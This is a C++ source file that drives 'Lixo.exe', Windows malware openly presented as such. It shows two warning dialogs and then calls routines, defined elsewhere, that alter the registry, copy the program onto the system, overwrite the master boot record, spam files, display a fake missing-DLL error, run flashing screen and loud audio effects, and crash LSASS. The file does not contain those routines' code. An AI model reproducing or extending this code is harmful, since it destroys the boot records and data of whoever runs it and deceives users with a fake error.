typedef struct IUnknown IUnknown;

#include "Lixo.h"

INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, INT nCmdShow)
{
	//If the computer wasn't infected before, it shows the warning messages.
	if (GetFileAttributesW(L"C:\\Windows\\WinNet.exe") == INVALID_FILE_ATTRIBUTES)
	{
		if (MessageBoxW(NULL, L"WARNING!\n\nYou're about to run a potentially harmful program that can cause your system's death & data loss. This program also displays flashing lights and plays loud sounds.\n\nBy running this program, you accept full responsibility for any damages that may occur. The creator (ArTic aka JhoPro) will not be responsible for anything caused by this software. By the way, this was created for educational and entertainment purposes.\n\nWould you like to proceed with running this program?", L"'We all make choices, but in the end our choices make us...'", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
		if (MessageBoxW(NULL, L"FINAL WARNING!\n\nIf you really want to run it and you're already aware of the risks, press 'Yes'. Otherwise, press 'No'.\n\nProceed at your own risk...", L"Lixo.exe - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	}

	//Create/Modify some Registry keys + Create copies of itself + Overwrite MBR
	Payloads::SpecialPayload();
	Payloads::OverwriteMBR();

	Sleep(1000 * 5);

	//Fake error message
	if (GetFileAttributesW(L"C:\\Windows\\WinNet.exe") == INVALID_FILE_ATTRIBUTES)
		MessageBoxW(NULL, L"The program can't start because MSVCP140.dll is missing from your computer. Try reinstalling the program to fix this problem.", L"Lixo.exe - System Error", MB_OK | MB_ICONERROR);
	
	Sleep(1000 * 5);

	Payloads::SpamFiles();
	System::RedrawScreen();

	//Shaking
	HANDLE hBB1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat1, hBB1, NULL, NULL);
	HANDLE hPayload1 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload1, hPML1, NULL, NULL);
	Sleep(1000 * 15); //15 Seconds 

	//Shaders
	HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPayload2 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload2, hPML2, NULL, NULL);
	Sleep(1000 * 10); //10 Seconds 
	System::EndPayload(hPayload2, hPML2);
	System::EndPayload(hBytebeat1, hBB1);

	//Icons
	HANDLE hBB2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat2, hBB2, NULL, NULL);
	HANDLE hPayload3 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload3, hPML3, NULL, NULL);
	Sleep(1000 * 5); //5 Seconds 

	//PatBlt
	HANDLE hPML4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPayload4 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload4, hPML4, NULL, NULL);
	Sleep(1000 * 15); //15 Seconds 

	//AlphaBlend
	HANDLE hPML5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPayload5 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload5, hPML5, NULL, NULL);
	Sleep(1000 * 15); //15 Seconds

	CreateThread(NULL, NULL, &Payloads::Message, NULL, NULL, NULL);
	Sleep(1000 * 5); //5 Seconds 
	
	System::EndPayload(hPayload1, hPML1);
	System::EndPayload(hPayload3, hPML3);
	System::EndPayload(hPayload4, hPML4);
	System::EndPayload(hPayload5, hPML5);
	System::EndPayload(hBytebeat2, hBB2);

	//XOR Fractal
	HANDLE hBB3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat3 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat3, hBB3, NULL, NULL);
	HANDLE hPayload6 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload6, hPML6, NULL, NULL);
	Sleep(1000 * 15); //15 Seconds 
	System::EndPayload(hPayload6, hPML6);
	System::EndPayload(hBytebeat3, hBB3);

	//Plasma
	HANDLE hBB4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat4 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat4, hBB4, NULL, NULL);
	HANDLE hPayload7 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload7, hPML7, NULL, NULL);
	Sleep(1000 * 15); //15 Seconds 
	System::EndPayload(hPayload7, hPML7);
	System::EndPayload(hBytebeat4, hBB4);
	System::RedrawScreen();

	//Mandelbrot
	HANDLE hBB5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat5 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat5, hBB5, NULL, NULL);
	HANDLE hPayload8 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload8, hPML8, NULL, NULL);
	Sleep(1000 * 15); //15 Seconds 
	System::EndPayload(hPayload8, hPML8);
	System::EndPayload(hBytebeat5, hBB5);
	
	//Crazy Circles + Pixelated Colors
	HANDLE hBB6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat6 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat6, hBB6, NULL, NULL);
	HANDLE hPayload9 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload9, hPML9, NULL, NULL);
	Sleep(1000 * 20); //20 Seconds 
	System::EndPayload(hPayload9, hPML9);
	System::EndPayload(hBytebeat6, hBB6);
	Payloads::CrashLSASS();

	//Hell
	HANDLE hBB7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat7 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat7, hBB7, NULL, NULL);
	HANDLE hPayload10 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload10, hPML10, NULL, NULL);
	Sleep(1000 * 20); //20 Seconds 
	System::EndPayload(hPayload10, hPML10);
	System::EndPayload(hBytebeat7, hBB7);
	System::RedrawScreen();

	//Pixelated
	HANDLE hBB8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML11 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat8 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat8, hBB8, NULL, NULL);
	HANDLE hPayload11 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload11, hPML11, NULL, NULL);
	Sleep(1000 * 20); //20 Seconds 
	System::EndPayload(hPayload11, hPML11);
	System::EndPayload(hBytebeat8, hBB8);

	//Shake + Glitchs   LAST PAYLOAD TILL LSASS COUNTDOWN
	HANDLE hBB9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hPML12 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
	HANDLE hBytebeat9 = CreateThread(NULL, NULL, &Bytebeats::Bytebeat9, hBB9, NULL, NULL);
	HANDLE hPayload12 = CreateThread(NULL, NULL, &GDIPayloads::GDIPayload12, hPML12, NULL, NULL);
	Sleep(INFINITE);

	return 0;
}
